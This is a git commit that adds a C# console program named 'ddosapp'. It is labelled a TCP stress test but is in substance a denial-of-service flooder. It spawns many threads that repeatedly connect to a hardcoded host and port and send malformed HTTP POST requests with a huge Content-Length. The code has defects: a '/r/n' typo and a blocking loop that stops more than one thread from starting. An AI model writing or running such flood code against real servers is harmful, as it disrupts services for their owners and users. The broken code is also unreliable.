90bc7e83e9ec4de0aea97d64ac31386a3204638c
Korsar Official <110203126+KorsarOfficial@users.noreply.github.com>
2023-10-18 01:20:48 +0300

    ServerStressTest(TCP)
    TCP Stress Test

---
+++ ddosapp/ddosapp/Program.cs
@@ -0,0 +1,44 @@
+﻿using System.Net.Sockets;
+using System.Threading;
+using System.IO;
+
+namespace ddosapp
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            string target = "192.168.1.1"; // хост цель
+            int port = 80; // цель порт
+            long threads = 9000000000000000000; // число нитей
+
+            for(int i = 0; i < threads; i++)
+            {
+                new Thread(() =>
+                {
+                    Thread.CurrentThread.IsBackground = true;
+                    while (true)
+                    {
+                        try
+                        {
+                            TcpClient client = new TcpClient();
+                            client.NoDelay = true;
+                            client.Connect(target, port); // подключение
+                            StreamWriter stream = new StreamWriter(client.GetStream());
+                            stream.Write("POST / HTTP/1.1/r/nHost: " + target + "\r\nContent-length: 9000000000000000000\r\n\r\n"); // отправка пакетов
+                            stream.Flush();
+                            client.Close();
+                        }
+                        catch
+                        {
+                            // !!
+                        }
+
+                    }
+                }).Start();
+                while (true) ;
+                // ожидание
+            }
+        }
+    }
+}
